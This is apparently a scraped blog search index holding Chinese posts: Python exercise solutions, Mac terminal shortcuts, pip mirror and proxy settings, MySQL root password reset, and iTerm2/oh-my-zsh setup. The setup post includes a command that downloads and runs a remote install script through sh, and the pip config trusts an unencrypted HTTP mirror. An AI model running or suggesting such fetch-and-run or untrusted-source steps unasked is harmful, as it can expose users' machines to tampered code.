② Servlet接受用户请求，并作初步处理，然后将请求进行转发 ③业务处理借助Bean","link":"/2020/09/12/Programming/JSP-JAVABEAN-SERVLET-MVC%E6%A8%A1%E5%9E%8B/"},{"title":"Python Encoder练习","text":"给定一个列表，使用列表推导式找出列表中长度大于 5 的名字，并打印该列表。 1234names = [['Tom', 'Billy', 'Jefferson', 'Andrew', 'Wesley', 'Steven', 'Joe'], ['Alice', 'Jill', 'Ana', 'Wendy', 'Jennifer', 'Sherry', 'Eva']]ret = [name for lst in names for name in lst if len(name)&gt;5]print(ret) 本题的关键在于，如何把names切片。names是一个二元列表。 本想着用split去做切片，但是不太合适，因为split是用来切割字符串的。 其实只用一个for循环就可以把元素全部提取出来。 name for lst in names for name in lst if len(name)&gt;5 的作用等同于： 1234for lst in names: #print(lst) for name in lst: print(name) 这里只用一个for循环，把names的二元列表变为两个一元列表lst，然后再通过name获取每个列表中的元素，并输出 最后ret = [name for lst in names for name in lst if len(name)&gt;5] 用一个列表推导式，把for循环中提取出来的元素赋值给ret列表 按规则输出一句话123456#--coding:utf-8v0 =5.0g = 9.81t = input() #输入时间y = v0*t-0.5*g*t**2 #牛顿第二定律print &quot;At t =%.1fs, a ball with\\ninitial velocity v0 = %.3E m/s\\nis located at the height %.2f m.&quot; % (t,v0,y) 求解一元二次方程1234567891011121314151617181920212223242526272829from numpy.lib.scimath import sqrta = int(input())b = int(input())c = int(input())if a == 0: if b == 0 and c ==0: print(&quot;There are infinitely many solutions!&quot;) else: if b==0: print (&quot;There is no solution&quot;) else: print(&quot;There is a unique solution x=%g&quot; %(-1*c/b))else: disc = b*b -4*a*c if disc &gt; 0: x1 = (-b + sqrt(disc)) / 2 / a x2 = (-b - sqrt(disc)) / 2 / a if disc &gt; 0: print(&quot;There are two distinct real roots x1=%g and x2=%g&quot; % (x1, x2)) else: print(&quot;There are two conjugate roots x1=%g and x2=%g&quot; % (x1, x2)) else: if disc == 0: print(&quot;There are two equal real roots x1=x2=%g&quot; % (-1 * b / 2 / a)) else: x1 = (-b + sqrt(disc)) / 2 / a x2 = (-b - sqrt(disc)) / 2 / a print(&quot;There are two conjugate roots x1=%s and x2=%s&quot; % (x1, x2)) lambda表达式应用12345678910111213141516171819# coding=utf-8# 请在此添加代码，使用lambda来创建匿名函数，能够判断输入的两个数值的大小########## Begin ##########MAXIMUM = lambda a,b:a if a&gt;b else bMINIMUM = lambda a,b:a if a&lt;b else b########## End ########### 输入两个正整数a = int(input())b = int(input())# 输出较大的值和较小的值print('较大的值是：%d' % MAXIMUM(a,b))print('较小的值是：%d' % MINIMUM(a,b)) 注意：三元运算、条件表达式 正整数分解质因数12345678910111213141516171819# coding=utf-8# 输入一个正整数x = int(input())# 请在此添加代码，将输入的一个正整数分解质因数########## Begin ##########n = xresult = []while n&gt;1: for i in range(2,n+1): if n%i ==0: n = int(n/i) result.append(i) break########## End ########### 输出结果，利用map()函数将结果按照规定字符串格式输出print(x,'=','*'.join(map(str,result))) 本题要点： 使用for循环，如何输出i之后再次用n/i作为新的n去从小到大输出i 最后结果怎么去把每次输出的i放入 奇偶数分别相加123456789m = int(input()) #接受输入的数字并将其转换为int型n = m%2 #判断其是奇数还是偶数sum = 0 #预设sum为0for i in alist: #遍历alist if i%2 == n: #选择与输入数奇偶性相同的数 sum += i #累加到sum里alist.append(sum) #将sum添加到alist的末尾print(alist) #打印alist 按揭贷款–定义抽象类part 1 123456789101112131415161718192021222324252627282930313233343536373839404142434445def findPayment(loan, r, m): #********** Begin *********# # 请在下面编写代码 return loan*((r*(1+r)**m)/((1+r)**m-1)) # 请不要修改下面的代码 #********** End *********#class Mortgage(object): def __init__(self, loan, annRate, months): #********** Begin *********# # 请在下面编写代码 self.loan =loan self.rate = annRate/1200.0 self.months = months self.paid = [0.0] self.owed = [loan] self.payment = findPayment(loan,self.rate,months) # 请不要修改下面的代码 #********** End *********# self.legend = None def makePayment(self): #********** Begin *********# # 请在下面编写代码 self.paid.append(self.payment) reduction = self.payment - self.owed[-1]*self.rate self.owed.append(self.owed[-1] - reduction) # 请不要修改下面的代码 #********** End *********# def getTotalPaid(self): #********** Begin *********# # 请在下面编写代码 return sum(self.paid) # 请不要修改下面的代码 #********** End *********# def __str__(self): return 'The Mortgage is {self.legend}, Loan is {self.loan}, Months is {self.months}, Rate is {self.rate:.2f}, Monthly payment is {self.payment:.2f}'.format(self=self)if __name__==&quot;__main__&quot;: print(Mortgage(100000, 6.5, 36)) print(Mortgage(100000, 6.5, 120)) part 2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384def findPayment(loan, r, m): return loan * ((r * (1 + r) ** m) / ((1 + r) ** m - 1))class Mortgage(object): def __init__(self, loan, annRate, months): self.loan = loan self.rate = annRate / 1200.0 self.months = months self.paid = [0.0] self.owed = [loan] self.payment = findPayment(loan, self.rate, self.months) self.legend = None def makePayment(self): self.paid.append(self.payment) reduction = self.payment - self.owed[-1] * self.rate self.owed.append(self.owed[-1] - reduction) def getTotalPaid(self): return sum(self.paid) def __str__(self): return str(self.legend)class Fixed(Mortgage): def __init__(self, loan, r, months): # 请在此添加代码，补全函数__init__ #********** Begin *********# Mortgage.__init__(self,loan,r,months) self.legend = 'Fixed, ' + str(r*100) + '%' #********** End *********# self.legend = 'Fixed, ' + str(r) + '%, for ' + str(months) + ' months'class FixedWithPoints(Mortgage): def __init__(self, loan, r, months, pts): # 请在此添加代码，补全函数__init__ #********** Begin *********# Mortgage.__init__(self,loan,r,months) self.pts = pts self.paid = [loan*(pts/100.0)] self.legend = 'Fixed, ' + str(r*100) +'%, ' + str(pts) + 'points' #********** End *********# self.legend = 'Fixed, ' + str(r) + '%, ' + str(pts) + ' points, for ' + str(months) + ' months'class TwoRate(Mortgage): def __init__(self, loan, r, months, teaserRate, teaserMonths): # 请在此添加代码，补全函数__init__ #********** Begin *********# Mortgage.__init__(self,loan,teaserRate,months) self.teaserMonths = teaserMonths self.teaserRate = teaserRate self.nextRate = r/1200.0 self.legend = str(teaserRate*100) + '%for' +str(self.teaserMonths) + ' months,then ' + str(r*100) + '%' #********** End *********# self.legend = str(teaserRate)\\ + '% for ' + str(self.teaserMonths)\\ + ' months, \\n then ' + str(r) + '%, for ' + str(months) + ' months' def makePayment(self): # 请在此添加代码，补全函数makePayment #********** Begin *********# if len(self.paid) == self.teaserMonths + 1: self.rate = self.nextRate self.payment = findPayment(self.owed[-1],self.rate,self.months - self.teaserMonths) #********** End *********# Mortgage.makePayment(self)if __name__==&quot;__main__&quot;: print(Fixed(100000, 6.5, 36)) print(Fixed(100000, 6.5, 120)) print(FixedWithPoints(100000, 6.5, 36, 20)) print(FixedWithPoints(100000, 6.5, 120, 20)) print(TwoRate(100000, 9.0, 36, 4.8, 12)) print(TwoRate(100000, 7.0, 120, 4.8, 36)) part 3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081def findPayment(loan, r, m): return loan * ((r * (1 + r) ** m) / ((1 + r) ** m - 1))class Mortgage(object): def __init__(self, loan, annRate, months): self.loan = loan self.rate = annRate / 1200.0 self.months = months self.paid = [0.0] self.owed = [loan] self.payment = findPayment(loan, self.rate, self.months) self.legend = None def makePayment(self): self.paid.append(self.payment) reduction = self.payment - self.owed[-1] * self.rate self.owed.append(self.owed[-1] - reduction) def getTotalPaid(self): return sum(self.paid) def __str__(self): return str(self.legend)class Fixed(Mortgage): def __init__(self, loan, r, months): Mortgage.__init__(self, loan, r, months) self.legend = 'Fixed, ' + str(r) + '%, for ' + str(months) + ' months'class FixedWithPoints(Mortgage): def __init__(self, loan, r, months, pts): Mortgage.__init__(self, loan, r, months) self.pts = pts self.paid = [loan * (pts / 100.0)] self.legend = 'Fixed, ' + str(r) + '%, ' + str(pts) + ' points, for ' + str(months) + ' months'class TwoRate(Mortgage): def __init__(self, loan, r, months, teaserRate, teaserMonths): Mortgage.__init__(self, loan, teaserRate, months) self.teaserMonths = teaserMonths self.teaserRate = teaserRate/1200 self.nextRate = r / 1200.0 self.legend = str(teaserRate)\\ + '% for ' + str(self.teaserMonths)\\ + ' months, \\n then ' + str(r) + '%, for ' + str(months) + ' months' def makePayment(self): if len(self.paid) == self.teaserMonths + 1: self.rate = self.nextRate self.payment = findPayment(self.owed[-1], self.rate, self.months - self.teaserMonths) Mortgage.makePayment(self)def compareMortgages(amt, years, fixedRate, pts, ptsRate, varRate1, varRate2, varMonths): # 请在此添加代码，补全函数compareMortgages #********** Begin *********# totMonths = years*12 fixed1 = Fixed(amt, fixedRate, totMonths) fixed2 = FixedWithPoints(amt, ptsRate, totMonths, pts) twoRate = TwoRate(amt, varRate2, totMonths, varRate1, varMonths) morts = [fixed1, fixed2, twoRate] #********** End *********# for m in range(totMonths): # 请在此添加代码，补全函数compareMortgages #********** Begin *********# for mort in morts: mort.makePayment() #********** End *********# for m in morts: print(m) print('Loan ' + str(amt) + ' Total payments = ' + str(int(m.getTotalPaid())))if __name__==&quot;__main__&quot;: compareMortgages(200000, 30, 7, 3.25, 5, 4.5, 9.5, 48) print('*'*40) compareMortgages(1000000, 30, 7, 20, 5, 4.5, 9.5, 48) print('*' * 40) compareMortgages(500000, 10, 7, 20, 5, 4.5, 9.5, 48)","link":"/2020/03/30/Programming/Python-Encoder%E7%BB%83%E4%B9%A0/"},{"title":"MAC命令行分屏快捷键","text":"⌘ + d: 垂直分屏， ⌘ + shift + d: 水平分屏。 ⌘ + ]和⌘ + [在最近使用的分屏直接切换. ⌘ + opt + 方向键切换到指定位置的分屏。 ⌘ + 数字: 切换标签页。 ⌘ + 方向键 按方向切换标签页。 shift + ⌘ + s: 保存当前窗口快照。 ⌘ + opt + b: 快照回放。很有意思的功能，你可以对你的操作根据时间轴进行回放。可以拖动下方的时间轴，也可以按左右方向键","link":"/2019/10/27/mac/MAC%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%88%86%E5%B1%8F%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"title":"python案例学习","text":"计算小于1000的所有整数中能够同时被5和7整除的最大整数 123456num = 1000while num &gt;= 0: if num % 5 == 0 and num % 7 == 0: print(&quot;可以同时被5和7整除的最大整数为: %d. &quot; % num) break num -= 1 要求用户输入若干使用空格分割的数字，输出这些数字中只出现过一次的那些数字1234nums = input('请以空格间隔输入若干数字：').split(' ')for num in nums: if nums.count(num) == 1: print(num) 生成一个包含15个介于1到50之间的随机整数的列表，为其循环左移5个元素1234567import randomlst = random.sample(range(1, 51), 15)print(lst)for i in range(5): lst.insert(len(lst), lst[0]) lst.remove(lst[0])print(lst) 辗转相除法1234567891011def ZhanZhuanChu(x, y): if x &lt; y: x, y = y, x while y: r = x % y x = y y = r return xa = int(input(&quot;a的值为:&quot;))b = int(input(&quot;b的值为:&quot;))print(ZhanZhuanChu(a,b)) 编写函数接收参数a和n，计算并返回形式如a + aa + aaa + aa…aa的表达式前n项的值，其中a为小于10的自然数123456789101112131415def Sum_n(a, n): if a &gt;= 10: return result = 0 for i in range(1, n + 1): #range(1,n+1)表示从1～n tmp = 0 for j in range(i): #range(i)从0开始 tmp = tmp + 10 ** j result = result + (a * tmp) return resulta = int(input(&quot;a的值为:&quot;))n = int(input(&quot;n的值为:&quot;))print(Sum_n(a,n)) 编写函数，接收字符串参数，返回一个元组，其中第一个元素为大写字母个数，第二个元素为小写字母个数1234567891011121314151617def demo(s): #result = (0,0) 出错，因为元组不能被修改，只能先用列表再转元组 result = [0,0] tmp1,tmp2 = '','' for ch in s: if ch.islower(): result[1] += 1 tmp1 = tmp1 + ch elif ch.isupper(): result[0] += 1 tmp2 = tmp2 +ch print('小写字母有：' + tmp1 + ' 共有' + str(result[0]) + '个') print('大写字母有：' + tmp2 + ' 共有' + str(result[1]) + '个') return tuple(result)print(demo('This Is A Test')) #编写函数，接收一个正偶数为参数，输出两个素数，并且这两个素数之和等于原来的正偶数。如果存在多组符合条件的素数，则全部输出 12345678910111213141516171819def demo(n): def IsPrime(p): if p == 2: return True # %2 求余数 if p % 2 == 0: return False # 假如n是合数，必然存在非1的两个约数p1和p2，其中p1&lt;=sqrt(n)，p2&gt;=sqrt(n) for i in range(3,int(p**0.5)+1,2): if p % i == 0: return False return True if isinstance(n,int) and n &gt; 0 and n % 2 == 0: for i in range(2,n//2+1): if IsPrime(i) and IsPrime(n-i): print(i,'+',n-i,'=',n)if __name__ == '__main__': demo(int(input(&quot;正偶数n的值为&quot;))) 编写函数，计算字符串匹配的准确率。以打字练习程序为例，假设origin为原始内容，userInput为用户输入的内容，下面的代码用来测试用户输入的准确率。12345678910111213def Rate(orgin,userInput): if not (isinstance(orgin,str)) and isinstance((userInput,str)): print('Both Two Must Be Strings') return orgin,userInput = list(orgin),list(userInput) #right = sum(1 for i in range(1,len(userInput)) if orgin[i] == userInput[i]) #用生成器表达式，zip函数把orgin和userInput压缩在一起，生成一个对象。更优 right = sum(1 for o,u in zip(orgin,userInput) if o == u ) return round(right/len(orgin),2)s1 = 'Read It Slow's2 = 'really'print(Rate(s1,s2)) 编写函数模拟猜数游戏。系统随机产生一个数，玩家最多可以猜5次，系统会根据玩家的猜测进行提示，玩家则可以根据系统的提示对下一次的猜测进行适当调整。本题注意prompt = ‘Start to guess’ 和else ‘Guess again’直接写在第一行，后面才是对prompt进行输入， 其实等同于prompt input(‘Start to guess:’) 但是在这里只用了一行又把报错的输入Guess again写了，很便利 12345678910111213141516171819202122232425262728from random import randintdef guess(maxValue=100,maxTimes=5): #随机生成一个数 value = randint(1,maxValue) for i in range(maxTimes): prompt = 'Start to guess:' if i ==0 else 'Gusee again:' #使用异常处理结构，防止输入不是数字 try: x = int(input(prompt)) except: print('Must input an interger between 1 and',maxValue) else: #猜对了 if x == value: print(&quot;Congratuations!&quot;) break elif x &gt; value: print(&quot;Too big&quot;) else: print(&quot;Too little&quot;) else: #次数用完还没猜对，游戏结束，提示正确答案 print('Game over.Fail') print('The value is',value)if __name__ == '__main__': guess() 编写函数模拟报数游戏。有n个人围成一圈，顺序编号，从第一个人开始从1到k（假设k=3）报数，报到k的人退出圈子，然后圈子缩小，从下一个人继续游戏，问最后留下的是原来的第几号。关键：循环器函数cycle 下图报错原因：循环到最后，range(1,k+1)已经超出列表的本身大小。所以本题的关键是是用cycle函数，把值一个一个取出来，而且不越界 123456789101112131415161718192021from itertools import cycledef demo(lst, k): #切片，以免影响原来的数据 t_lst = lst[:] #游戏一直进行到只剩下最后一个人 while len(t_lst)&gt;1: #创建cycle对象 c = cycle(t_lst) #从1到k报数 for i in range(k): t = next(c) #一个人出局，圈子缩小 index = t_lst.index(t) t_lst = t_lst[index+1:] + t_lst[:index] #游戏结束 return t_lst[0]lst = list(range(1,11))print(demo(lst, 3)) 编写函数计算任意位数的黑洞数。黑洞数是指这样的整数：由这个数字每位上的数字组成的最大数减去每位数字组成的最小数仍然得到这个数自身例如3位黑洞数是495，因为954-459=495，4位数字是6174，因为7641-1467=6174。 12345678910111213141516def main(n): '''参数n表示数字的位数，例如n=3时返回495，n=4时返回6174''' #待测试数范围的起点和结束值 start = 10**(n-1) end = 10**n #依次测试每个数 for i in range(start, end): #由这几个数字组成的最大数和最小数 big = ''.join(sorted(str(i),reverse=True)) little = ''.join(reversed(big)) big, little = map(int,(big, little)) if big-little == i: print(i)n = 4main(n) 编写函数，寻找给定序列中相差最小的两个数字12345678910111213141516171819202122import randomdef getTwoClosestElements(seq): #先进行排序，使得相邻元素最接近 #相差最小的元素必然相邻 seq = sorted(seq) #无穷大 dif = float('inf') #遍历所有元素，两两比较，比较相邻元素的差值,同时去掉最大值和最小值，所以是seql[:-1]和seq[i+1] #使用选择法寻找相差最小的两个元素 #enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在for循环当中 for i,v in enumerate(seq[:-1]): d = abs(v - seq[i+1]) if d &lt; dif: first, second, dif = v, seq[i+1], d #返回相差最小的两个元素 return (first, second)seq = [random.randint(1, 10000) for i in range(20)]print(seq)print(sorted(seq))print(getTwoClosestElements(seq))","link":"/2020/03/19/Programming/python%E6%A1%88%E4%BE%8B%E5%AD%A6%E4%B9%A0/"},{"title":"MAC配置pip国内源","text":"MAC配置pip国内源 步骤如下： 1.进入 “~” 目录 cd ~2.创建.pip文件夹 mkdir .pip3.进入文件夹 cd .pip4.创建文件 touch pip.conf5.vim打开文件，输入以下内容 [global]index-url = http://pypi.douban.com/simple[install]trusted-host=pypi.douban.com6.可以替换的国内源 阿里云 ：http://mirrors.aliyun.com/pypi/simple/中国科学技术大学：https://pypi.mirrors.ustc.edu.cn/simple/清华大学：https://pypi.tuna.tsinghua.edu.cn/simple/豆瓣：http://pypi.douban.com/simple mac安装mysql报错报错 user/local/mysql/data directory is not owned by the mysql user 解决： sudo chown -RL root:mysql /usr/local/mysql sudo chown -RL mysql:mysql /usr/local/mysql/data sudo /usr/local/mysql/support-files/mysql.server start mac数据库密码忘记方法一mysql版本：5.7.171.首先我们要关闭mysql服务sudo /usr/local/mysql/support-files/mysql.server stop2.我们要用安全模式启动mysqlsudo /usr/local/mysql/bin/mysqld_safe –skip-grant-tables3.使用root账号登录mysql服务/usr/local/mysql/bin/mysql u root4.修改root账号的密码（其实这运行的是sql语句）update mysql.user set authentication_string=password(‘qingyun1’) where user=’root’ and Host = ‘localhost’;如果有必要，建议运行一下:flush privileges;5.关闭安全模式，正常的重启mysqlsudo /usr/local/mysql/support-files/mysql.server restart6.正常的使用root账号和密码连接mysql/usr/local/mysql/bin/mysql -u root -p 方法二如果忘记密码,强行修改:1、停止Mysql服务 sudo /usr/local/mysql/support-files/mysql.server stop2、 进入终端输入：cd /usr/local/mysql/bin/ 回车后;登录管理员权限 sudo su 回车后;输入以下命令来禁止mysql验证功能 ./mysqld_safe –skip-grant-tables &amp; 回车后mysql会自动重启（偏好设置中mysql的状态会变成running） 3、输入命令 ./mysql 回车后，输入命令 FLUSH PRIVILEGES; 回车后，输入命令 ALTER USER ‘root’@’localhost’ IDENTIFIED BY ‘你的新密码’; 第三种 停止 mysql server. 通常是在 ‘系统偏好设置’ &gt; MySQL &gt; ‘Stop MySQL Server’或者: sudo /usr/local/mysql/support-files/mysql.server stop 打开终端，输入： sudo /usr/local/mysql/bin/mysqld_safe –skip-grant-tables 打开另一个新终端，输入: sudo /usr/local/mysql/bin/mysql -u root UPDATE mysql.user SET authentication_string=PASSWORD(‘新密码’) WHERE User=’root’; FLUSH PRIVILEGES; \\q 重启 sudo /usr/local/mysql/support-files/mysql.server restart *以上方法针对 mysql V5.7.9, 旧版的mysql请使用：UPDATE mysql.user SET Password=PASSWORD(‘新密码’) WHERE User=’root’; MAC安装go环境问题执行go build时报错 go: github.com/spf13/cobra@v0.0.5: Get https://proxy.golang.org/github.com/spf13/cobra/@v/v0.0.5.mod: dial tcp 216.58.200.241:443: i/o timeout 很明显被qiang了嘛 建立socks全局代理：export https_proxy=socks5://127.0.0.1:1087 export https_proxy=http://127.0.0.1:1087 export http_proxy=http://127.0.0.1:1087 注意mac的ssr代理端口为1087，windows为1080 取消代理：unset http_proxy 之后又报错说时间延迟，那么就直接去下载吧 go get -u github.com/spf13/cobra/cobra 再执行go build正常。 brew报错报错如下： 1Error: Failure while executing; `git clone https://github.com/Homebrew/homebrew-cask-fonts /usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask-fonts --depth=1` exited with 128. 权限问题，但是sudo有违brew的保护作用，dangerous 解决：vim /usr/local/Homebrew/Library/Homebrew/download_strategy.rb 最后添加： 12345678def clone_repo puts `which git` # add this guy safe_system 'git', *clone_args cached_location.cd do safe_system &quot;git&quot;, &quot;config&quot;, &quot;homebrew.cacheversion&quot;, cache_version update_submodules if submodules? endend 保存重新安装即可 参考：https://github.com/Homebrew/homebrew-cask/issues/10041","link":"/2019/10/20/mac/MAC%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98/"},{"title":"MAC终端优化","text":"综述 iTerm2 + zsh + oh-my-zsh + powerlevel9k 插件：autojump 安装 iTerm2下面的安装我几乎都用 brew 方式了，如果你还不懂什么是 brew 可以看看 这个。 所以下面我假设你已经安装了 Homebrew。 如果你从来没有运行过 brew cask 命令，可以先执行： 1brew tap caskroom/cask brew caskbrew tap caskroom/cask 报错 如果安装失败,显示Error: Cask ‘brew-cask’ is unavailable: ‘/usr/local/Homebrew/Library/Taps/caskroom/homebrew-cask/Casks/brew-cask.rb’ does not exist. 尝试 brew install brew-cask-completion 然后开始安装 iTerm2 1brew cask install iterm2 安装成功后在 Launchpad 中可以看到有一个新图标出现，打开 iTerm2。 代码配色默认的界面还是略显丑陋的，我们来设置一下代码配色吧。 先检查下终端颜色配置为 xterm-256color，位置在 iTerm2 -&gt; Preferences -&gt; Profiles -&gt; Terminal。 然后就可以设置配色了，默认情况下 iTerm2 只有 7 种自带的配色，当然满足不了我们高颜值的需求了。有人就开源了一款叫 iTerm2-Color-Schemes 的配色合集，里面有各种经典、常用的配色方案，来使用 Git 下载到本地。 123mkdir ~/.iterm2 &amp;&amp; cd ~/.iterm2git clone https://github.com/mbadolato/iTerm2-Color-Schemes 这里我创建了一个 ~/.iterm2 的目录，放在别的目录都可以，它的目录结构是这样的： 1234567891011121314151617 ~/.iterm2/iTerm2-Color-Schemes $ ls -latotal 72-rw-r--r-- 1 biezhi staff 34131 Nov 6 11:34 README.mddrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 Xresourcesdrwxr-xr-x 3 biezhi staff 96 Nov 6 11:34 backgroundsdrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 konsoledrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 puttydrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 remminadrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 schemesdrwxr-xr-x 200 biezhi staff 6400 Nov 6 11:34 screenshotsdrwxr-xr-x 180 biezhi staff 5760 Nov 6 11:34 terminaldrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 terminatordrwxr-xr-x 199 biezhi staff 6368 Nov 6 11:34 termitedrwxr-xr-x 162 biezhi staff 5184 Nov 6 11:34 tildadrwxr-xr-x 19 biezhi staff 608 Nov 6 11:34 toolsdrwxr-xr-x 3 biezhi staff 96 Nov 6 11:34 xfce4terminaldrwxr-xr-x 198 biezhi staff 6336 Nov 6 11:34 xrdb 下面需要导入配色方案。 选择 schemes 文件夹内的所有配色方案。 导入成功后就可以选择一些流行的配色方案了。 选择配色后再去你的 iTerm 里面看会发现，已经好看了那么一点。 安装字体为什么要安装字体呢？我们电脑的字体其实是可以用的，但是想要图标的这种字体就没法儿了： 而这些图标字体其实是非 ASCII 码字体，在 iTerm2 中可以进行配置，所以先要安装这个字体。这款字体叫 nerd-fonts，它支持下面这么多种图标。 使用 brew 安装 12brew tap caskroom/fontsbrew cask install font-hack-nerd-font 注意：安装的时候会去 Github 下载字体，如果你下载失败可能是被墙了。 那么可以通过 https_proxy=127.0.0.1:1087 brew cask reinstall font-hack-nerd-font 的方式安装，前提是你开启了代理。 安装成功后需要在 iTerm2 中配置一下，在 iTerm2 -&gt; Preferences -&gt; Profiles -&gt; Text -&gt; Font -&gt; Change Font 栏位中，Text 下面勾选 Use a different font for non-ASCII text，然后在 Non-ASCII font 点击 Change font 修改： 这里选择的字体是非 ASCII 码字符的字体，不要设置错了！选择好之后关闭即可。 安装 zsh1brew install zsh 默认的 shell 是 bash，需要修改为 zsh： 12sudo sh -c &quot;echo $(which zsh) &gt;&gt; /etc/shells&quot;chsh -s $(which zsh) 修改时会提示你输入密码。 现在 zsh 安装完成了，安装虽简单，可配置麻烦啊，这你能忍吗？？当然不能！ 于是，oh-my-zsh 出现了，有了它 zsh 配置起来就方便多了，来安装一下它。 1sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; 安装好之后可以看到界面发生了一点点变化，同时会产生一个名为 .zshrc 的配置文件，在用户家目录下面，我们以后主要就是修改它了。 配置主题上面看到界面发生变化是因为 oh-my-zsh 默认帮我们配置了一个终端主题，你可以打开 ~/.zshrc 文件看看： 1ZSH_THEME=&quot;robbyrussell&quot; 这些主题文件存储在 ~/.oh-my-zsh/themes 目录下，你也可以使用其他的。 为了实现前面想要的酷炫的终端主题，有人写了一个名为 powerlevel9k 的高颜值主题。 看到这么骚的操作，赶紧来安装吧！先将主题下载到本地的主题目录中： 1git clone https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/themes/powerlevel9k 然后修改 zsh 主题配置： 1ZSH_THEME=&quot;powerlevel9k/powerlevel9k&quot; 修改配置文件后一定要记得让配置生效，使用 source 命令： 1source ~/.zshrc 现在来看看终端变成什么样子了！ 我这里 iTerm2 的代码配色选择的是：Dracula 如果你喜欢这个风格的话可以不用进行其他主题设置了，为了让它看起来简洁一点，我在 .zshrc 配置中又添加了几行： 12345POWERLEVEL9K_MODE=&quot;nerdfont-complete&quot;# Customise the Powerlevel9k promptsPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(ssh dir vcs newline status)POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=()POWERLEVEL9K_PROMPT_ADD_NEWLINE=true POWERLEVEL9K_MODE：设置 powerlevel9k 的字体是我们前面下载的 POWERLEVEL9K_LEFT_PROMPT_ELEMENTS：将前面居右的几个元素放在左边了 POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS：右边不放置任何元素（如果你喜欢在右边也可以加） POWERLEVEL9K_PROMPT_ADD_NEWLINE：在每个提示之前添加换行符 现在它变成这样了 更详细的配置可以参考 Prompt Customization 和 Stylizing Your Prompt。 别名设置装好 zsh 之后顺手就添加一下我自己常用的别名： 123456alias cls='clear'alias ll='ls -l'alias la='ls -a'alias vi='vim'alias ssr=&quot;export http_proxy=http://127.0.0.1:1087&quot;alias grep='grep --color=auto' 这样我们只需要输入较短的命令就可以干大事情了！当然这里你可以设置更多自己熟悉的一些操作，比如和编程语言相关的等等。 插件autojumpautojump可以很方便地帮我们切换到指定目录，它的工作原理是维护一个命令行中使用过的目录的数据库。 mac下安装： 1brew install autojump autojump 支持 zsh，添加以下内容到 ~/.bash_profile 或 ~/.zshrc 文件中： 1[[ -s $(brew --prefix)/etc/profile.d/autojump.sh ]] &amp;&amp; . $(brew --prefix)/etc/profile.d/autojump.sh 记得使用 source 命令使刚才的内容生效： 12source ~/.bash_profilesource ~/.zshrc 我们可以使用更简洁的命令 j 来实现目录跳转，j 是对 autojump 命令的包装。在使用 autojump 切换目录前，需要在命令行中使用过该目录。跳转到包含 te 的目录： 1j te 话不多说，来看下效果： 使用文件管理器打开目录： 1jo te autojump 支持自动补全，使用Tab键查看匹配的多个目录： 查看 autojump 存储的目录的状态： 1j -s 可以看到每个目录都有对应权重，所以当出现匹配多个目录会跳到权重较大的目录下。 zsh-syntax-highlighting简介：平常用的ls、cd 等命令输入正确会绿色高亮显示，输入错误会显示其他的颜色。 安装： 克隆项目 1git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting 在 ~/.zshrc 中配置 1plugins=(其他的插件 zsh-syntax-highlighting) 使配置生效 1source ~/.zshrc zsh-autosuggestions简介：效率神器，可自动补齐 安装： 克隆项目 1git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions 在 ~/.zshrc 中配置 1plugins=(其他的插件 zsh-autosuggestions) 使配置生效 1source ~/.zshrc sublime官网 已经内置直接启用即可 作用 在命令行使用 Sublime Text 打开文件、项目 命令 作用 st 打开 sublime st + 文件夹 打开该文件夹 st + 文件 打开该文件 stt 打开当前的文件夹，相当于 st . sst 管理员权限 相当于 sudo st extract功能强大的解压插件，所有类型的文件解压一个命令x全搞定，再也不需要去记tar后面到底是哪几个参数了。 如： 1`x biezhi.zip` 在内置直接启用即可。在 .zshrc 的 plugins 中添加 extract 配置即可，它支持解压 这些 文件。 colorscolors 是一个 Ruby 实现的脚本，它可以配合 powerlevel9k 显示电脑上的文件图标（应该是通过后缀判断的），使用的效果如下： 安装后就可以使用了 1gem install colorls 官网：https://github.com/athityakumar/colorls","link":"/2019/10/27/mac/MAC%E7%BB%88%E7%AB%AF%E4%BC%98%E5%8C%96/"},{"title":"MAC终端命令行配置网络代理","text":"一、前言 网络代理诉求与macOS终端命令行学校、公司等组织内部我们访问一些网络资源的时候必须要使用代理，或者访问某些国外的资料文献受地区影响访问很慢，也需要使用代理来加速。macOS下一些软件的安装或者升级就需要访问GitHub等服务，然而GitHub或者国外其他的资源下载站点比如Maven仓库等等直接访问网络总不是不稳定，不是网速太慢就是动不动断开连接，如果我们有代理服务器进行加速，这些都不是问题。 然而，macOS下的终端命令行是默认不使用系统代理配置的，这就需要我们单独来设置。 准备工作与环境信息 准备工作 网络代理服务器 网络代理客户端 为了方便测试，请将网络代理客户端设置为全局模式 如果这两者你都没有，可以使用：https://github.com/shadowsocks 环境信息 代理类型 地址信息 socks5 socks5://127.0.0.1:1087 http `http://127.0.0.1:1087 配置时任选其一即可 注：mac下端口为1087 windows下端口为1080 二、配置过程1、自定义命令配置如果你没安装过zsh，请按照系统默认终端命令行操作 macOS默认终端命令行1.修改bash，配置自定义命令 1vi ~/.bash_profile ​ 2.在文件结尾增加以下配置 123# proxyalias proxy='export all_proxy=socks5://127.0.0.1:1080'alias unproxy='unset all_proxy' 或者 123#ssralias ssr=&quot;export http_proxy=http://127.0.0.1:1087&quot;alias unssr=&quot;unset http_proxy&quot; ​ 3.使配置生效 1source ~/.bash_profile zsh命令行配置 ​ 1.修改bash，配置自定义命令 1vi ~/.zshrc 